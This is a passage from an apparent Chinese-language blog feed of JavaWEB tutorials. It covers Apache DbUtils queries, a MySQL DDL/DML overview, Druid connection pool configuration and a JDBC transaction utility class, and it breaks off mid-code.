class="hljs-number">234</span>&#125;<br><br><br><span class="hljs-comment">//查询全部==================================</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;<br>        PersonDao personDao = <span class="hljs-keyword">new</span> PersonDaoImpl();<br>        List&lt;Person&gt; lps= personDao.queryAll();<br>        <span class="hljs-keyword">for</span>(Person p : lps)&#123;<br>            System.out.println(p);<br>        &#125;<br><br>    &#125;<br><br><span class="hljs-comment">//输出</span><br>Person&#123;id=<span class="hljs-number">123</span>, name=<span class="hljs-string">&#x27;qqewr&#x27;</span>, money=<span class="hljs-number">34</span>&#125;<br>Person&#123;id=<span class="hljs-number">234</span>, name=<span class="hljs-string">&#x27;loong&#x27;</span>, money=<span class="hljs-number">234</span>&#125;<br>Person&#123;id=<span class="hljs-number">423</span>, name=<span class="hljs-string">&#x27;wer&#x27;</span>, money=<span class="hljs-number">54</span>&#125;<br>Person&#123;id=<span class="hljs-number">434</span>, name=<span class="hljs-string">&#x27;qqewr&#x27;</span>, money=<span class="hljs-number">34</span>&#125;<br>Person&#123;id=<span class="hljs-number">908</span>, name=<span class="hljs-string">&#x27;qqewr&#x27;</span>, money=<span class="hljs-number">34</span>&#125;<br>Person&#123;id=<span class="hljs-number">4231</span>, name=<span class="hljs-string">&#x27;tewt&#x27;</span>, money=<span class="hljs-number">234</span>&#125;<br>Person&#123;id=<span class="hljs-number">4234</span>, name=<span class="hljs-string">&#x27;qqewr&#x27;</span>, money=<span class="hljs-number">34</span>&#125;<br>Person&#123;id=<span class="hljs-number">4349</span>, name=<span class="hljs-string">&#x27;qqewr&#x27;</span>, money=<span class="hljs-number">34</span>&#125;<br>Person&#123;id=<span class="hljs-number">42234</span>, name=<span class="hljs-string">&#x27;qqewr&#x27;</span>, money=<span class="hljs-number">34</span>&#125;<br>Person&#123;id=<span class="hljs-number">422234</span>, name=<span class="hljs-string">&#x27;qqewr&#x27;</span>, money=<span class="hljs-number">34</span>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="4-ScalarHandler类的应用"><a href="#4-ScalarHandler类的应用" class="headerlink" title="4.ScalarHandler类的应用"></a>4.ScalarHandler类的应用</h2><p>在Dao层中新增 <code>public long querySum();</code>方法，用来查询总个数。实现类中具体实现代码：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">long</span> <span class="hljs-title">querySum</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-comment">//返回值需要为long，不能为int</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">long</span> PersonSum = queryRunner.query(<span class="hljs-string">&quot;select count(*) from Te&quot;</span>,<span class="hljs-keyword">new</span> ScalarHandler&lt;&gt;());<br>        <span class="hljs-keyword">return</span> PersonSum;<br>    &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>        e.printStackTrace();<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>测试代码：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;<br>    PersonDao personDao = <span class="hljs-keyword">new</span> PersonDaoImpl();<br>    System.out.println(personDao.querySum()); <span class="hljs-comment">//10,可见上面查询结果</span><br><br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>星星之火-数据库的DDL、DML、DQL、DCL</title>
    <link href="/2021/08/15/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84DDL%E3%80%81DML%E3%80%81DQL%E3%80%81DCL/"/>
    <url>/2021/08/15/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84DDL%E3%80%81DML%E3%80%81DQL%E3%80%81DCL/</url>
    
    <content type="html"><![CDATA[<p>积土成山，风雨兴焉；积水成渊，蛟龙生焉；积善成德，而神明自得，圣心备焉。故不积跬步，无以至千里，不积小流无以成江海。齐骥一跃，不能十步，驽马十驾，功不在舍。面对悬崖峭壁，一百年也看不出一条裂缝来，但用斧凿，能进一寸进一寸，能进一尺进一尺，不断积累，飞跃必来，突破随之。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>MySQL基本操作：</p><ul><li>DDL（数据定义语言）：数据定义语言主要用来定义数据库中的各类对象，包括用户、库、表、视图、索引、触发器、事件、存储过程和函数等。</li><li>DML（数据操纵语言）：用来操作数据库中的表数据，主要包括的操作有：INSERT，UPDATE，DELETE。</li><li>DQL（数据查询语言）：主要用来查看表中的数据，也是平时使用最多的操作，主要命令为：SELECT。</li><li>DCL（数据控制语言）：用来授予或回收访问数据库的某种特权，并控制数据库操纵事务发生的时间及效果。</li></ul><h2 id="1-DDL"><a href="#1-DDL" class="headerlink" title="1.DDL"></a>1.DDL</h2><p>操作数据库、表、列等（对这些对象进行操作，即对数据库、表结构进行操作。），使用的关键字：CREATE、 ALTER、 DROP。</p><h2 id="2-DML"><a href="#2-DML" class="headerlink" title="2.DML"></a>2.DML</h2><p>DML 只是对表内部的数据操作，不涉及表的定义，结构的修改。是对表中的数据进行增、删、改、查等操作。</p>]]></content>
    
    
    <categories>
      
      <category>星星之火</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MySQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWEB-（十一）Druid连接池</title>
    <link href="/2021/08/14/JavaWEB/JavaWEB-%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Druid%E8%BF%9E%E6%8E%A5%E6%B1%A0/"/>
    <url>/2021/08/14/JavaWEB/JavaWEB-%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Druid%E8%BF%9E%E6%8E%A5%E6%B1%A0/</url>
    
    <content type="html"><![CDATA[<p>Druid连接池是阿里巴巴开源的数据库连接池项目。Druid连接池为监控而生，内置强大的监控功能，监控特性不影响性能。功能强大，能防SQL注入，内置Loging能诊断Hack应用行为。Druid连接池内置了WallFilter 提供防SQL注入功能，在不影响性能的同时防御SQL注入攻击。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p><a href="https://github.com/alibaba/druid/wiki/Druid%E8%BF%9E%E6%8E%A5%E6%B1%A0%E4%BB%8B%E7%BB%8D">阿里巴巴Druid连接池开源项目地址</a></p><h3 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1.环境准备"></a>1.环境准备</h3><p>下载 Druid jar包。并导入到项目中。</p><h3 id="2-Druid连接池工具类"><a href="#2-Druid连接池工具类" class="headerlink" title="2.Druid连接池工具类"></a>2.Druid连接池工具类</h3><blockquote><p>db.properties </p></blockquote><p><strong style="color:green"> ⚠️特别提醒：username、password不能写成简写。必须写成这两个！！！ </strong></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">driver=com.mysql.cj.jdbc.Driver<br>url=jdbc:mysql://localhost:3306/WeekDay?serverTimezone=GMT%2B8<br>username=root <span class="hljs-comment"># 必须写成username，不能写成user或者其他的</span><br>password=loong461 <span class="hljs-comment"># 同上</span><br><span class="hljs-comment"># Druid连接池=======================================</span><br><span class="hljs-comment"># 初始化连接数量</span><br>initialSize=10<br><span class="hljs-comment"># 最大连接数量，当初始化的用完时，就继续新建</span><br>maxActive=30<br><span class="hljs-comment"># 最小空闲连接数量，即连初始化的都长时间没有用时，也会将其释放，直至最小空闲连接数量</span><br>minIdle=5<br><span class="hljs-comment"># 超时等待时间，以毫秒为单位。如果有超过最大连接数量的需求，则超过部分需要等待相应的时间，如果超了等待时间，就不会再等，即拿不到连接。</span><br>maxWait=5000<br></code></pre></div></td></tr></table></figure><blockquote><p>DbUtils.java</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tothefor.OtherTest.Duid.Utils;<br><br><span class="hljs-keyword">import</span> com.alibaba.druid.pool.DruidDataSource;<br><span class="hljs-keyword">import</span> com.alibaba.druid.pool.DruidDataSourceFactory;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.ResultSet;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.Statement;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/14 23:33</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DbUtils</span> </span>&#123;<br>    <span class="hljs-comment">//声明连接池对象</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> DruidDataSource dds;<br>    <span class="hljs-keyword">static</span>&#123;<br>        Properties properties = <span class="hljs-keyword">new</span> Properties();<br>        InputStream is = DbUtils.class.getResourceAsStream(<span class="hljs-string">&quot;/db.properties&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            properties.load(is);<br>            <span class="hljs-comment">//创建连接池</span><br>           dds = (DruidDataSource) DruidDataSourceFactory.createDataSource(properties);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title">getConnection</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">return</span> dds.getConnection();<span class="hljs-comment">//通过连接池获取连接对象</span><br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">closeAll</span><span class="hljs-params">(Connection connection, Statement statement, ResultSet resultSet)</span></span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span>(resultSet != <span class="hljs-keyword">null</span>)&#123;<br>                resultSet.close();<br>            &#125;<br>            <span class="hljs-keyword">if</span>(statement != <span class="hljs-keyword">null</span>)&#123;<br>                statement.close();<br>            &#125;<br>            <span class="hljs-keyword">if</span>(connection != <span class="hljs-keyword">null</span>)&#123;<br>                connection.close();<br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span> (SQLException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><blockquote><p>测试函数</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tothefor.OtherTest.Duid.Utils.Test;<br><br><span class="hljs-keyword">import</span> com.tothefor.OtherTest.Duid.Utils.DbUtils;<br><br><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/14 23:49</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DbUtilsTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">15</span>; ++i)&#123;<br>            Connection connection = DbUtils.getConnection();<br>            System.out.println(connection);<br>            <span class="hljs-comment">//放回连接池</span><br>            connection.close();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//输出</span><br>com.mysql.cj.jdbc.ConnectionImpl<span class="hljs-meta">@fe18270</span><br>com.mysql.cj.jdbc.ConnectionImpl<span class="hljs-meta">@fe18270</span><br>com.mysql.cj.jdbc.ConnectionImpl<span class="hljs-meta">@fe18270</span><br>com.mysql.cj.jdbc.ConnectionImpl<span class="hljs-meta">@fe18270</span><br>com.mysql.cj.jdbc.ConnectionImpl<span class="hljs-meta">@fe18270</span><br>com.mysql.cj.jdbc.ConnectionImpl<span class="hljs-meta">@fe18270</span><br>com.mysql.cj.jdbc.ConnectionImpl<span class="hljs-meta">@fe18270</span><br>com.mysql.cj.jdbc.ConnectionImpl<span class="hljs-meta">@fe18270</span><br>com.mysql.cj.jdbc.ConnectionImpl<span class="hljs-meta">@fe18270</span><br>com.mysql.cj.jdbc.ConnectionImpl<span class="hljs-meta">@fe18270</span><br>com.mysql.cj.jdbc.ConnectionImpl<span class="hljs-meta">@fe18270</span><br>com.mysql.cj.jdbc.ConnectionImpl<span class="hljs-meta">@fe18270</span><br>com.mysql.cj.jdbc.ConnectionImpl<span class="hljs-meta">@fe18270</span><br>com.mysql.cj.jdbc.ConnectionImpl<span class="hljs-meta">@fe18270</span><br>com.mysql.cj.jdbc.ConnectionImpl<span class="hljs-meta">@fe18270</span><br>  <br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">  这里的connection是一样的，因为取出后放回了连接池中，如果不放回（不要close()），则会有15个不同的connection。而且默认是10个，最高连接数为30。</span><br><span class="hljs-comment">  */</span><br></code></pre></div></td></tr></table></figure><p><strong>放回连接池处调用的close()并不是关闭，而是放回连接池。因为调用的close()是DruidPooledConnection实现类中的close()。</strong></p>]]></content>
    
    
    <categories>
      
      <category>JavaWEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWEB-（十）JDBC连接数据库工具类封装事务</title>
    <link href="/2021/08/14/JavaWEB/JavaWEB-%EF%BC%88%E5%8D%81%EF%BC%89JDBC%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B7%A5%E5%85%B7%E7%B1%BB%E5%B0%81%E8%A3%85%E4%BA%8B%E5%8A%A1/"/>
    <url>/2021/08/14/JavaWEB/JavaWEB-%EF%BC%88%E5%8D%81%EF%BC%89JDBC%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B7%A5%E5%85%B7%E7%B1%BB%E5%B0%81%E8%A3%85%E4%BA%8B%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[<p>一般来说，事务是必须满足4个条件（ACID）：原子性（Atomicity，或称不可分割性）、一致性（Consistency）、隔离性（Isolation，又称独立性）、持久性（Durability）。一般在默认情况下，事务都是自动提交的。即执行 SQL 语句后就会马上执行 COMMIT 操作。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>使用JDBC连接数据库工具类来封装事务，只需要添加对应的方法即可。再在业务层调用即可。</p><h3 id="1-开启事务"><a href="#1-开启事务" class="headerlink" title="1.开启事务"></a>1.开启事务</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">begin</span><span class="hljs-params">()</span></span>&#123;<br>        Connection connection = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            connection = getConnection();<br>            connection.setAutoCommit(<span class="hljs-keyword">false</span>); <span class="hljs-comment">//设置为手动提交事务</span><br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-提交事务"><a href="#2-提交事务" class="headerlink" title="2.提交事务"></a>2.提交事务</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">commit</span><span class="hljs-params">()</span></span>&#123;<br>        Connection connection = <span class="hljs-keyword">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            connection = getConnection();<br>            connection.commit(); <span class="hljs-comment">//此commit非方法名commit</span><br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            e.printStackTrace();<br>        &#125;<span class="hljs-keyword">finally</span> &#123;<br>            closeAll(connection,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>);<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure><h3 id="3-回滚事务"><a href="#3-回滚事务" class="headerlink" title="3.回滚事务"></a>3.回滚事务</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">rollback</span><span class="hljs-params">()</span></span>&#123;<br>        Connection connection = <span class="hljs-keyword">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            connection = getConnection();<br>            connection.rollback(); <span class="hljs-comment">//此rollback非方法名rollback</span><br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            e.printStackTrace();<br>        &#125;<span class="hljs-keyword">finally</span> &#123;<br>            closeAll(connection,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>);<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-移除Connection对象"><a href="#4-移除Connection对象" class="headerlink" title="4.移除Connection对象"></a>4.移除Connection对象</h3><p>如果不移除，则会有 “占着茅坑不拉屎” 的现象。只需要在 closeAll() 方法中，在关闭 connection 之后进行移除。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">tl.remove();<br></code></pre></div></td></tr></table></figure><h3 id="5-完整工具类"><a href="#5-完整工具类" class="headerlink" title="5.完整工具类"></a>5.完整工具类</h3><p>代码实现</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tothefor.Utils;<br><br><span class="hljs-keyword">import</span> com.mysql.cj.jdbc.ha.MultiHostMySQLConnection;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.sql.*;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/11 14:52</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MoreMove</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Properties pr = <span class="hljs-keyword">new</span> Properties();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ThreadLocal&lt;Connection&gt; tl = <span class="hljs-keyword">new</span> ThreadLocal&lt;&gt;();<span class="hljs-comment">//为线程创建了一个共享对象，用来共享的是 Connection</span><br><br>    <span class="hljs-keyword">static</span> &#123;<br>        InputStream is = MoreMove.class.getResourceAsStream(<span class="hljs-string">&quot;/db.properties&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            pr.load(is);<br>            Class.forName(pr.getProperty(<span class="hljs-string">&quot;driver&quot;</span>));<br>        &#125; <span class="hljs-keyword">catch</span> (IOException | ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title">getConnection</span><span class="hljs-params">()</span></span>&#123;<br>        Connection connection = tl.get();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span>(connection == <span class="hljs-keyword">null</span>)&#123;<br>            connection = DriverManager.getConnection(pr.getProperty(<span class="hljs-string">&quot;url&quot;</span>),pr.getProperty(<span class="hljs-string">&quot;user&quot;</span>),pr.getProperty(<span class="hljs-string">&quot;password&quot;</span>));<br>            tl.set(connection);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> connection;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">begin</span><span class="hljs-params">()</span></span>&#123;<br>        Connection connection = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            connection = getConnection();<br>            connection.setAutoCommit(<span class="hljs-keyword">false</span>); <span class="hljs-comment">//设置为手动提交事务</span><br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">commit</span><span class="hljs-params">()</span></span>&#123;<br>        Connection connection = <span class="hljs-keyword">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            connection = getConnection();<br>            connection.commit(); <span class="hljs-comment">//此commit非方法名commit</span><br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            e.printStackTrace();<br>        &#125;<span class="hljs-keyword">finally</span> &#123;<br>            closeAll(connection,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">rollback</span><span class="hljs-params">()</span></span>&#123;<br>        Connection connection = <span class="hljs-keyword">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            connection = getConnection();<br>            connection.rollback(); <span class="hljs-comment">//此rollback非方法名rollback</span><br>        &#125; <span 